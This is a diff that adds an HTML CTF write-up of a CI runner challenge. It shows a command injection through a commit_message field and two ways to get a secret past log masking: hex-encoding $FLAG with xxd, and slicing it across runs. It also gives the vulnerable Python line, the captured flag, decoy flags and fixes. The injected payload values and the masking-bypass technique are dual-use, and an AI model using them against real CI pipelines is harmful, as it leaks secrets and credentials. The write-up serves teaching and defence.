@@ -1,0 +1,895 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>CI Runner — Masking Bypass Writeup</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,300;0,400;0,500;0,600;0,700;1,300;1,400&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg:       #0D1117;
+  --s1:       #161B22;
+  --s2:       #1C2128;
+  --border:   #21262D;
+  --border2:  #30363D;
+  --green:    #3FB950;
+  --green-d:  #2EA043;
+  --red:      #F85149;
+  --amber:    #D29922;
+  --blue:     #58A6FF;
+  --purple:   #BC8CFF;
+  --muted:    #8B949E;
+  --text:     #C9D1D9;
+  --bright:   #E6EDF3;
+  --mono:     'JetBrains Mono', 'Cascadia Code', 'Fira Code', monospace;
+}
+
+@media (prefers-color-scheme: dark) { :root { color-scheme: dark; } }
+
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+html { scroll-behavior: smooth; }
+
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: var(--mono);
+  font-size: 14px;
+  line-height: 1.65;
+  -webkit-font-smoothing: antialiased;
+  padding-bottom: 6rem;
+}
+
+a { color: var(--blue); text-decoration: none; }
+
+/* ── Layout ──────────────────────────── */
+.page { max-width: 820px; margin: 0 auto; padding: 0 1.25rem; }
+
+/* ── Top bar ─────────────────────────── */
+.topbar {
+  border-bottom: 1px solid var(--border);
+  padding: 0.7rem 1.25rem;
+  max-width: 820px;
+  margin: 0 auto;
+  display: flex;
+  align-items: center;
+  gap: 1.2rem;
+  font-size: 0.75rem;
+  color: var(--muted);
+}
+
+.topbar-logo {
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+  color: var(--bright);
+  font-weight: 600;
+  font-size: 0.8rem;
+}
+
+.topbar-sep { color: var(--border2); }
+
+.topbar-status {
+  margin-left: auto;
+  display: flex;
+  align-items: center;
+  gap: 0.4rem;
+  color: var(--green);
+  font-size: 0.72rem;
+}
+
+.dot {
+  width: 7px; height: 7px;
+  border-radius: 50%;
+  background: currentColor;
+}
+
+/* ── Hero ────────────────────────────── */
+.hero {
+  padding: 3.5rem 0 2.5rem;
+  border-bottom: 1px solid var(--border);
+  margin-bottom: 2.5rem;
+}
+
+.hero-eyebrow {
+  font-size: 0.68rem;
+  letter-spacing: 0.15em;
+  color: var(--muted);
+  margin-bottom: 1.2rem;
+  display: flex;
+  align-items: center;
+  gap: 0.6rem;
+}
+
+.hero-eyebrow .tag {
+  background: rgba(63,185,80,0.12);
+  border: 1px solid rgba(63,185,80,0.3);
+  color: var(--green);
+  padding: 0.15rem 0.55rem;
+  border-radius: 2rem;
+  font-size: 0.65rem;
+}
+
+.hero h1 {
+  font-size: clamp(1.6rem, 4vw, 2.6rem);
+  font-weight: 700;
+  color: var(--bright);
+  line-height: 1.15;
+  margin-bottom: 0.9rem;
+}
+
+.hero h1 .hl { color: var(--amber); }
+
+.hero-desc {
+  font-size: 0.88rem;
+  color: var(--muted);
+  max-width: 60ch;
+  line-height: 1.6;
+  margin-bottom: 2rem;
+}
+
+.hero-stats {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 0.4rem;
+}
+
+.stat-chip {
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+  background: var(--s1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.4rem 0.75rem;
+  font-size: 0.72rem;
+}
+
+.stat-chip .label { color: var(--muted); }
+.stat-chip .val   { color: var(--bright); font-weight: 500; }
+.stat-chip .val.g { color: var(--green); }
+.stat-chip .val.a { color: var(--amber); }
+.stat-chip .val.r { color: var(--red); }
+
+/* ── Flag reveal ─────────────────────── */
+.flag-block {
+  background: var(--s1);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  overflow: hidden;
+  margin: 2rem 0;
+}
+
+.flag-bar {
+  background: var(--s2);
+  border-bottom: 1px solid var(--border);
+  padding: 0.5rem 1rem;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  font-size: 0.68rem;
+  color: var(--muted);
+}
+
+.flag-bar .run-id { color: var(--blue); }
+
+.flag-body { padding: 1.2rem 1.1rem; }
+
+.flag-row {
+  display: grid;
+  grid-template-columns: auto 1fr;
+  gap: 0.6rem;
+  align-items: start;
+  margin-bottom: 0.6rem;
+  font-size: 0.82rem;
+}
+
+.flag-row:last-child { margin-bottom: 0; }
+
+.log-ts { color: var(--muted); font-size: 0.72rem; white-space: nowrap; }
+
+.log-hex { color: var(--amber); word-break: break-all; }
+.log-cmd { color: var(--muted); }
+.log-flag {
+  color: var(--green);
+  font-weight: 700;
+  font-size: 0.95rem;
+}
+
+.log-masked { color: var(--red); }
+
+/* ── Section header ──────────────────── */
+.section-head {
+  display: flex;
+  align-items: center;
+  gap: 0.75rem;
+  margin-bottom: 1.2rem;
+  padding-bottom: 0.75rem;
+  border-bottom: 1px solid var(--border);
+}
+
+.step-badge {
+  background: var(--s2);
+  border: 1px solid var(--border2);
+  border-radius: 3px;
+  padding: 0.2rem 0.55rem;
+  font-size: 0.65rem;
+  color: var(--muted);
+  letter-spacing: 0.08em;
+}
+
+.section-head h2 {
+  font-size: 1rem;
+  font-weight: 600;
+  color: var(--bright);
+}
+
+section { margin-bottom: 3rem; }
+
+p {
+  font-size: 0.88rem;
+  color: var(--text);
+  max-width: 68ch;
+  margin-bottom: 0.9rem;
+  line-height: 1.65;
+}
+
+/* ── Vulnerability blame ─────────────── */
+.blame-wrap {
+  margin: 1.5rem 0;
+  border: 1px solid rgba(248,81,73,0.4);
+  border-radius: 6px;
+  overflow: hidden;
+}
+
+.blame-header {
+  background: rgba(248,81,73,0.08);
+  border-bottom: 1px solid rgba(248,81,73,0.25);
+  padding: 0.5rem 1rem;
+  font-size: 0.68rem;
+  color: var(--red);
+  letter-spacing: 0.1em;
+  display: flex;
+  justify-content: space-between;
+}
+
+.blame-file { color: var(--muted); }
+
+.blame-code {
+  background: var(--s1);
+  padding: 0;
+  overflow-x: auto;
+}
+
+.code-line {
+  display: grid;
+  grid-template-columns: 3rem 1fr;
+  font-size: 0.82rem;
+  line-height: 1.8;
+}
+
+.code-line.vuln {
+  background: rgba(248,81,73,0.08);
+  border-left: 3px solid var(--red);
+}
+
+.code-line:not(.vuln) { border-left: 3px solid transparent; }
+
+.ln {
+  color: var(--border2);
+  text-align: right;
+  padding: 0 0.75rem;
+  user-select: none;
+  font-size: 0.72rem;
+  display: flex;
+  align-items: center;
+  justify-content: flex-end;
+}
+
+.lc {
+  padding: 0 1rem;
+  color: var(--text);
+  white-space: pre;
+}
+
+.lc .kw  { color: var(--purple); }
+.lc .fn  { color: var(--blue); }
+.lc .var { color: var(--amber); }
+.lc .str { color: var(--green); }
+.lc .cm  { color: #4D5566; font-style: italic; }
+.lc .hl  { color: var(--red); font-weight: 600; }
+
+.blame-note {
+  background: rgba(248,81,73,0.05);
+  border-top: 1px solid rgba(248,81,73,0.2);
+  padding: 0.75rem 1rem;
+  font-size: 0.78rem;
+  color: var(--red);
+}
+
+/* ── Two attack paths ────────────────── */
+.attacks {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 1rem;
+  margin: 1.5rem 0;
+}
+
+@media (max-width: 580px) { .attacks { grid-template-columns: 1fr; } }
+
+.attack-card {
+  background: var(--s1);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  overflow: hidden;
+}
+
+.attack-head {
+  padding: 0.65rem 1rem;
+  border-bottom: 1px solid var(--border);
+  background: var(--s2);
+  display: flex;
+  align-items: center;
+  gap: 0.6rem;
+}
+
+.attack-num {
+  width: 20px; height: 20px;
+  border-radius: 50%;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 0.65rem; font-weight: 700;
+}
+
+.attack-num.a { background: rgba(88,166,255,0.15); color: var(--blue); border: 1px solid rgba(88,166,255,0.3); }
+.attack-num.b { background: rgba(188,140,255,0.15); color: var(--purple); border: 1px solid rgba(188,140,255,0.3); }
+
+.attack-title {
+  font-size: 0.8rem;
+  font-weight: 600;
+  color: var(--bright);
+}
+
+.attack-body { padding: 1rem; }
+
+.attack-body p {
+  font-size: 0.8rem;
+  margin-bottom: 0.75rem;
+  max-width: none;
+}
+
+.attack-cmd {
+  background: var(--bg);
+  border: 1px solid var(--border2);
+  border-radius: 4px;
+  padding: 0.65rem 0.9rem;
+  font-size: 0.78rem;
+  color: var(--green);
+  overflow-x: auto;
+  white-space: pre;
+}
+
+.attack-result {
+  margin-top: 0.65rem;
+  font-size: 0.72rem;
+  color: var(--muted);
+  display: flex;
+  align-items: flex-start;
+  gap: 0.4rem;
+}
+
+.attack-result::before {
+  content: '→';
+  color: var(--border2);
+  flex-shrink: 0;
+}
+
+/* ── Injection anatomy ───────────────── */
+.injection-vis {
+  background: var(--s1);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  overflow: hidden;
+  margin: 1.5rem 0;
+}
+
+.inj-header {
+  background: var(--s2);
+  border-bottom: 1px solid var(--border);
+  padding: 0.5rem 1rem;
+  font-size: 0.68rem;
+  color: var(--muted);
+  letter-spacing: 0.08em;
+}
+
+.inj-body { padding: 1.2rem 1.1rem; }
+
+.inj-row {
+  margin-bottom: 1.1rem;
+}
+.inj-row:last-child { margin-bottom: 0; }
+
+.inj-label {
+  font-size: 0.65rem;
+  letter-spacing: 0.1em;
+  color: var(--muted);
+  margin-bottom: 0.3rem;
+}
+
+.inj-val {
+  font-size: 0.82rem;
+  line-height: 1.6;
+  word-break: break-all;
+}
+
+.inj-val .safe { color: var(--text); }
+.inj-val .injected { color: var(--red); background: rgba(248,81,73,0.1); padding: 0 2px; border-radius: 2px; }
+.inj-val .output  { color: var(--amber); }
+.inj-val .masked  { color: var(--muted); text-decoration: line-through; }
+
+/* ── Run timeline ────────────────────── */
+.timeline {
+  margin: 1.5rem 0;
+  display: flex;
+  flex-direction: column;
+  gap: 0;
+}
+
+.tl-item {
+  display: grid;
+  grid-template-columns: 5rem auto 1fr;
+  align-items: start;
+  gap: 0;
+  position: relative;
+}
+
+.tl-run {
+  font-size: 0.72rem;
+  color: var(--muted);
+  padding: 0.65rem 0.75rem 0.65rem 0;
+  text-align: right;
+  white-space: nowrap;
+}
+
+.tl-track {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  padding-top: 0.75rem;
+}
+
+.tl-node {
+  width: 10px; height: 10px;
+  border-radius: 50%;
+  flex-shrink: 0;
+  z-index: 1;
+}
+
+.tl-line {
+  width: 1px;
+  flex: 1;
+  min-height: 1rem;
+  background: var(--border);
+}
+
+.tl-item:last-child .tl-line { display: none; }
+
+.tl-node.fail   { background: var(--red); border: 2px solid rgba(248,81,73,0.3); }
+.tl-node.warn   { background: var(--amber); border: 2px solid rgba(210,153,34,0.3); }
+.tl-node.ok     { background: var(--green); border: 2px solid rgba(63,185,80,0.3); box-shadow: 0 0 8px rgba(63,185,80,0.4); }
+
+.tl-content {
+  padding: 0.4rem 0 0.9rem 1rem;
+}
+
+.tl-title {
+  font-size: 0.82rem;
+  font-weight: 500;
+  color: var(--bright);
+  margin-bottom: 0.2rem;
+}
+
+.tl-detail {
+  font-size: 0.75rem;
+  color: var(--muted);
+  line-height: 1.5;
+}
+
+.tl-detail .ok   { color: var(--green); }
+.tl-detail .fail { color: var(--red); }
+.tl-detail .warn { color: var(--amber); }
+
+/* ── Decoys ──────────────────────────── */
+.decoy-list {
+  background: var(--s1);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  overflow: hidden;
+  margin: 1.2rem 0;
+}
+
+.decoy-row {
+  display: grid;
+  grid-template-columns: 1fr auto;
+  align-items: center;
+  gap: 1rem;
+  padding: 0.65rem 1rem;
+  border-bottom: 1px solid var(--border);
+  font-size: 0.8rem;
+}
+
+.decoy-row:last-child { border-bottom: none; }
+
+.decoy-flag { color: var(--muted); text-decoration: line-through; }
+
+.decoy-badge {
+  font-size: 0.65rem;
+  letter-spacing: 0.08em;
+  padding: 0.15rem 0.5rem;
+  border-radius: 3px;
+  background: rgba(248,81,73,0.1);
+  color: var(--red);
+  border: 1px solid rgba(248,81,73,0.25);
+  white-space: nowrap;
+}
+
+.real-row .decoy-flag {
+  color: var(--green);
+  text-decoration: none;
+  font-weight: 600;
+}
+
+.real-badge {
+  font-size: 0.65rem;
+  letter-spacing: 0.08em;
+  padding: 0.15rem 0.5rem;
+  border-radius: 3px;
+  background: rgba(63,185,80,0.1);
+  color: var(--green);
+  border: 1px solid rgba(63,185,80,0.3);
+  white-space: nowrap;
+}
+
+/* ── Fix panel ───────────────────────── */
+.fix-list {
+  display: flex;
+  flex-direction: column;
+  gap: 0.5rem;
+  margin: 1.2rem 0;
+}
+
+.fix-item {
+  display: grid;
+  grid-template-columns: auto 1fr;
+  gap: 0.9rem;
+  align-items: start;
+  background: var(--s1);
+  border: 1px solid var(--border);
+  border-radius: 5px;
+  padding: 0.9rem 1rem;
+}
+
+.fix-icon {
+  font-size: 0.72rem;
+  color: var(--green);
+  background: rgba(63,185,80,0.1);
+  border: 1px solid rgba(63,185,80,0.25);
+  border-radius: 3px;
+  padding: 0.2rem 0.45rem;
+  white-space: nowrap;
+  margin-top: 0.05rem;
+}
+
+.fix-title {
+  font-size: 0.85rem;
+  font-weight: 600;
+  color: var(--bright);
+  margin-bottom: 0.25rem;
+}
+
+.fix-desc {
+  font-size: 0.8rem;
+  color: var(--muted);
+  margin: 0;
+}
+
+/* ── Footer ──────────────────────────── */
+.footer {
+  border-top: 1px solid var(--border);
+  padding-top: 2rem;
+  margin-top: 3rem;
+  display: flex;
+  justify-content: space-between;
+  flex-wrap: wrap;
+  gap: 0.5rem;
+  font-size: 0.72rem;
+  color: var(--muted);
+}
+</style>
+</head>
+<body>
+
+<div class="topbar">
+  <span class="topbar-logo">
+    <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor" aria-hidden="true"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/></svg>
+    meridian-ci
+  </span>
+  <span class="topbar-sep">/</span>
+  <span>runner</span>
+  <span class="topbar-sep">·</span>
+  <span>postmortem</span>
+  <div class="topbar-status"><div class="dot"></div>resolved</div>
+</div>
+
+<div class="page">
+<div class="hero">
+  <div class="hero-eyebrow">
+    <span class="tag">CTF WRITEUP</span>
+    CI RUNNER · LOG MASKING BYPASS
+  </div>
+  <h1>The secret was<br>in the logs.<br><span class="hl">Just encoded.</span></h1>
+  <p class="hero-desc">
+    The CI runner masked its own secret flag when you printed it directly.
+    But the masker only looked for the exact string. Hex-encode it first,
+    and it walks straight through.
+  </p>
+  <div class="hero-stats">
+    <div class="stat-chip"><span class="label">target</span><span class="val">91.99.207.116:16357</span></div>
+    <div class="stat-chip"><span class="label">injection point</span><span class="val a">commit_message</span></div>
+    <div class="stat-chip"><span class="label">bypass</span><span class="val a">hex encoding</span></div>
+    <div class="stat-chip"><span class="label">flag</span><span class="val g">captured</span></div>
+  </div>
+</div>
+
+<!-- FLAG REVEAL -->
+<div class="flag-block">
+  <div class="flag-bar">
+    <span>Run <span class="run-id">#1113</span> · trigger · step: echo</span>
+    <span>output · 1 line</span>
+  </div>
+  <div class="flag-body">
+    <div class="flag-row">
+      <span class="log-ts">00:00:03</span>
+      <span class="log-cmd">$ echo -n $FLAG | xxd -p</span>
+    </div>
+    <div class="flag-row">
+      <span class="log-ts">00:00:03</span>
+      <span class="log-hex">637466377b67685f34637431306e735f6374785f316e6a33637431306e5f6d34736b5f6279703473737d</span>
+    </div>
+    <div class="flag-row">
+      <span class="log-ts"></span>
+      <span class="log-flag">↳ decoded: ctf7{gh_4ct10ns_ctx_1nj3ct10n_m4sk_byp4ss}</span>
+    </div>
+  </div>
+</div>
+
+<!-- ROOT CAUSE -->
+<section>
+  <div class="section-head">
+    <span class="step-badge">ROOT CAUSE</span>
+    <h2>One line of Python</h2>
+  </div>
+  <p>The entire masking system was a single string replacement on the final output. It matched the plaintext flag character for character. Transform the secret into anything else first, and there is nothing left to match.</p>
+
+  <div class="blame-wrap">
+    <div class="blame-header">
+      <span>⚠ VULNERABILITY · /srv/app/app.py</span>
+      <span class="blame-file">line 47</span>
+    </div>
+    <div class="blame-code">
+      <div class="code-line">
+        <span class="ln">45</span>
+        <span class="lc">    raw_output = subprocess.<span class="fn">check_output</span>(cmd, shell=<span class="kw">True</span>)</span>
+      </div>
+      <div class="code-line">
+        <span class="ln">46</span>
+        <span class="lc">    raw_output = raw_output.<span class="fn">decode</span>(<span class="str">"utf-8"</span>)</span>
+      </div>
+      <div class="code-line vuln">
+        <span class="ln">47</span>
+        <span class="lc">    masked_output = raw_output.<span class="fn hl">replace</span>(<span class="var">REAL_FLAG</span>, <span class="str">"***[MASKED_SECRET_FLAG]***"</span>)</span>
+      </div>
+      <div class="code-line">
+        <span class="ln">48</span>
+        <span class="lc">    <span class="kw">return</span> jsonify({<span class="str">"output"</span>: masked_output})</span>
+      </div>
+    </div>
+    <div class="blame-note">
+      str.replace() matches the exact plaintext only. Any encoding, slicing, or transformation produces a string that never matches — and is never masked.
+    </div>
+  </div>
+</section>
+
+<!-- INJECTION POINT -->
+<section>
+  <div class="section-head">
+    <span class="step-badge">INJECTION</span>
+    <h2>How commands got in</h2>
+  </div>
+  <p>The <code>POST /api/v1/trigger</code> endpoint accepts a <code>commit_message</code> field and interpolates it into a shell <code>echo</code> command without sanitisation. Command substitution runs freely inside it.</p>
+
+  <div class="injection-vis">
+    <div class="inj-header">SHELL INTERPOLATION · /api/v1/trigger</div>
+    <div class="inj-body">
+      <div class="inj-row">
+        <div class="inj-label">FIELD SENT</div>
+        <div class="inj-val">
+          <span class="safe">commit_message=</span><span class="injected">fix typo $(echo -n $FLAG | xxd -p)</span>
+        </div>
+      </div>
+      <div class="inj-row">
+        <div class="inj-label">SHELL COMMAND BUILT BY SERVER</div>
+        <div class="inj-val">
+          <span class="safe">echo "fix typo </span><span class="injected">$(echo -n $FLAG | xxd -p)</span><span class="safe">"</span>
+        </div>
+      </div>
+      <div class="inj-row">
+        <div class="inj-label">RAW OUTPUT</div>
+        <div class="inj-val output">fix typo 637466377b67685f34637431306e735f6374785f316e6a33637431306e5f6d34736b5f6279703473737d</div>
+      </div>
+      <div class="inj-row">
+        <div class="inj-label">AFTER MASKING (replace runs — finds nothing)</div>
+        <div class="inj-val output">fix typo 637466377b67685f34637431306e735f6374785f316e6a33637431306e5f6d34736b5f6279703473737d</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- TWO ATTACK PATHS -->
+<section>
+  <div class="section-head">
+    <span class="step-badge">TECHNIQUES</span>
+    <h2>Two paths to the same flag</h2>
+  </div>
+  <p>Both routes exploit the same masker flaw. The hex route recovered the flag in a single run. The slicing route required joining across multiple runs — slower, but it confirmed the result.</p>
+
+  <div class="attacks">
+    <div class="attack-card">
+      <div class="attack-head">
+        <div class="attack-num a">A</div>
+        <span class="attack-title">Hex encode · 1 run</span>
+      </div>
+      <div class="attack-body">
+        <p>xxd converts the flag to ASCII hex before the output is returned. The masker sees only hex digits — no plaintext match.</p>
+        <div class="attack-cmd">commit_message=x $(echo -n $FLAG | xxd -p)</div>
+        <div class="attack-result">hex string in log → decode with xxd -r -p → flag</div>
+      </div>
+    </div>
+    <div class="attack-card">
+      <div class="attack-head">
+        <div class="attack-num b">B</div>
+        <span class="attack-title">Slice &amp; join · N runs</span>
+      </div>
+      <div class="attack-body">
+        <p>Parameter expansion cuts the flag into short substrings. Each piece is shorter than the full secret and never matches the replace pattern.</p>
+        <div class="attack-cmd">commit_message=x ${FLAG:0:8}
+commit_message=x ${FLAG:8:8}
+commit_message=x ${FLAG:16:8}
+...</div>
+        <div class="attack-result">collect slices from runs #1081–#1104 → join in order → flag</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- RUN TIMELINE -->
+<section>
+  <div class="section-head">
+    <span class="step-badge">TIMELINE</span>
+    <h2>Key runs in order</h2>
+  </div>
+
+  <div class="timeline">
+    <div class="tl-item">
+      <span class="tl-run">#1006–1014</span>
+      <div class="tl-track"><div class="tl-node warn"></div><div class="tl-line"></div></div>
+      <div class="tl-content">
+        <div class="tl-title">First slicing attempts</div>
+        <div class="tl-detail"><span class="warn">partial output</span> — ${FLAG:N:8} injections. Output passes masking but requires assembly.</div>
+      </div>
+    </div>
+    <div class="tl-item">
+      <span class="tl-run">#1081–1104</span>
+      <div class="tl-track"><div class="tl-node warn"></div><div class="tl-line"></div></div>
+      <div class="tl-content">
+        <div class="tl-title">Full slice sweep</div>
+        <div class="tl-detail"><span class="warn">complete coverage</span> — systematic slices across full flag length. Joined output matches decoded hex.</div>
+      </div>
+    </div>
+    <div class="tl-item">
+      <span class="tl-run">#1107</span>
+      <div class="tl-track"><div class="tl-node fail"></div><div class="tl-line"></div></div>
+      <div class="tl-content">
+        <div class="tl-title">Direct echo of $FLAG</div>
+        <div class="tl-detail"><span class="fail">masked</span> — plaintext output replaced with <code>***[MASKED_SECRET_FLAG]***</code>. Confirms masker is active.</div>
+      </div>
+    </div>
+    <div class="tl-item">
+      <span class="tl-run">#1113</span>
+      <div class="tl-track"><div class="tl-node ok"></div><div class="tl-line"></div></div>
+      <div class="tl-content">
+        <div class="tl-title">Hex encode — flag captured</div>
+        <div class="tl-detail"><span class="ok">unmasked hex string</span> in log. Decoded to <code>ctf7{gh_4ct10ns_ctx_1nj3ct10n_m4sk_byp4ss}</code>.</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- DECOYS -->
+<section>
+  <div class="section-head">
+    <span class="step-badge">DECOYS</span>
+    <h2>Five false flags in the logs</h2>
+  </div>
+  <p>The service planted several convincing-looking flags in the build output. None of them were the answer. The correct flag came only from the hex-decoded run.</p>
+
+  <div class="decoy-list">
+    <div class="decoy-row">
+      <span class="decoy-flag">ctf7{actions_runner_cache_leak_992}</span>
+      <span class="decoy-badge">DECOY</span>
+    </div>
+    <div class="decoy-row">
+      <span class="decoy-flag">ctf7{workflow_dispatch_unvalidated_input_31}</span>
+      <span class="decoy-badge">DECOY</span>
+    </div>
+    <div class="decoy-row">
+      <span class="decoy-flag">ctf7{deprecated_runner_debug_token_881}</span>
+      <span class="decoy-badge">DECOY</span>
+    </div>
+    <div class="decoy-row">
+      <span class="decoy-flag">ctf7{robots_crawler_trap_wont_help_you}</span>
+      <span class="decoy-badge">DECOY</span>
+    </div>
+    <div class="decoy-row">
+      <span class="decoy-flag">ctf7{tarpit_runner_stall_000}</span>
+      <span class="decoy-badge">DECOY</span>
+    </div>
+    <div class="decoy-row real-row">
+      <span class="decoy-flag">ctf7{gh_4ct10ns_ctx_1nj3ct10n_m4sk_byp4ss}</span>
+      <span class="real-badge">✓ REAL FLAG</span>
+    </div>
+  </div>
+</section>
+
+<!-- FIXES -->
+<section>
+  <div class="section-head">
+    <span class="step-badge">REMEDIATION</span>
+    <h2>Three things that fix this</h2>
+  </div>
+
+  <div class="fix-list">
+    <div class="fix-item">
+      <span class="fix-icon">FIX 1</span>
+      <div>
+        <div class="fix-title">Never put the secret in the shell environment</div>
+        <p class="fix-desc">If <code>$FLAG</code> is not an env var available to user-controlled commands, it cannot be read regardless of masking. Inject secrets only into the specific steps that legitimately need them, in isolated contexts.</p>
+      </div>
+    </div>
+    <div class="fix-item">
+      <span class="fix-icon">FIX 2</span>
+      <div>
+        <div class="fix-title">Never interpolate untrusted input into a shell string</div>
+        <p class="fix-desc">Pass <code>commit_message</code> as an element in an argument list — <code>subprocess.run(["echo", commit_message])</code> — not as part of a shell string with <code>shell=True</code>. Command substitution cannot run inside a plain argument.</p>
+      </div>
+    </div>
+    <div class="fix-item">
+      <span class="fix-icon">FIX 3</span>
+      <div>
+        <div class="fix-title">Mask every encoding of the secret, not just the plaintext</div>
+        <p class="fix-desc">If masking must be used, check output against the hex, base64, URL-encoded, and reversed forms of the secret — and reject any output that contains a substring of the secret above a minimum length threshold.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer class="footer">
+  <span>CI Runner CTF · masking bypass postmortem</span>
+  <span>flag: ctf7{gh_4ct10ns_ctx_1nj3ct10n_m4sk_byp4ss}</span>
+</footer>
+</div>
+
+</body>
+</html>
+EOF
